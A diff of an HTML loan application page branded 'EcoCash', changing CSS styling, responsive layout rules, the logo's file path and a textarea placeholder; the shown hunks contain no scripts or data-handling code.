@@ -7,28 +7,42 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
   :root { --bg:#dfeeff; --card:#fff; --muted:#6b7280; --accent:#1766ff; --round:14px; }
-  body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#e8f2ff,#cfe6ff);margin:0;padding:36px;display:flex;justify-content:center}
-  .wrap{width:100%;max-width:820px}
-  .card{background:var(--card);border-radius:var(--round);padding:26px;box-shadow:0 12px 30px rgba(9,30,66,0.06)}
-  .logo{height:48px;display:block;margin:0 auto 10px}
-  h1{text-align:center;color:#1851d3;margin:6px 0 6px;font-size:28px}
-  p.lead{text-align:center;color:var(--muted);margin:0 0 14px;font-size:13px}
+  *{box-sizing:border-box}
+  body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#e8f2ff,#cfe6ff);margin:0;padding:18px;display:flex;justify-content:center}
+  .wrap{width:100%;max-width:920px;padding:12px}
+  .card{background:var(--card);border-radius:var(--round);padding:20px;box-shadow:0 12px 30px rgba(9,30,66,0.06)}
+  .logo{height:48px;display:block;margin:0 auto 12px}
+  h1{text-align:center;color:#1851d3;margin:6px 0 8px;font-size:22px}
+  p.lead{text-align:center;color:var(--muted);margin:0 0 12px;font-size:13px}
   .note{background:#fff3cd;border-left:6px solid #ffd84d;padding:10px;border-radius:8px;color:#7a5f00;margin:12px 0}
   form{display:grid;grid-template-columns:1fr;gap:12px}
   label{display:block;font-size:13px;color:#374151}
   .req{color:#d04444;margin-right:6px}
-  input,select,textarea{width:100%;padding:10px 12px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;box-sizing:border-box}
+  input,select,textarea{width:100%;padding:10px 12px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;box-sizing:border-box;font-size:14px}
+  textarea{min-height:92px}
   .small{font-size:12px;color:var(--muted)}
-  .btn{background:var(--accent);color:#fff;padding:12px;border-radius:10px;border:0;font-weight:600;cursor:pointer;margin-top:10px;width:100%}
+  .btn{background:var(--accent);color:#fff;padding:12px;border-radius:10px;border:0;font-weight:600;cursor:pointer;margin-top:6px;width:100%}
   .row{display:flex;gap:12px}
-  @media(min-width:760px){ form{grid-template-columns:1fr 1fr} textarea{grid-column:1/3} .actions{grid-column:1/3} }
+  .actions{display:flex;justify-content:flex-end;align-items:center}
+  @media(min-width:760px){
+    form{grid-template-columns:repeat(2,1fr)}
+    textarea{grid-column:1/3}
+    .actions{grid-column:1/3}
+    .full{grid-column:1/3}
+  }
+  @media(max-width:420px){
+    body{padding:12px}
+    .card{padding:16px}
+    h1{font-size:20px}
+    .logo{height:42px}
+  }
 </style>
 </head>
 <body>
   <div class="wrap">
     <div class="card">
-      <!-- logo using uploaded file path -->
-      <img src="sandbox:/mnt/data/eco.png" alt="EcoCash logo" class="logo" onerror="this.style.display='none'">
+      <!-- logo served from your repo assets folder -->
+      <img src="assets/eco.png" alt="EcoCash logo" class="logo">
 
       <h1>EcoCash Loan Application</h1>
       <p class="lead">Please fill in required fields. All information is kept confidential and used only for loan processing and verification.</p>
@@ -91,7 +105,7 @@
         </label>
 
         <label class="full">Additional Details
-          <textarea name="details"></textarea>
+          <textarea name="details" placeholder="Any other information"></textarea>
         </label>
 
         <label>Reference Name
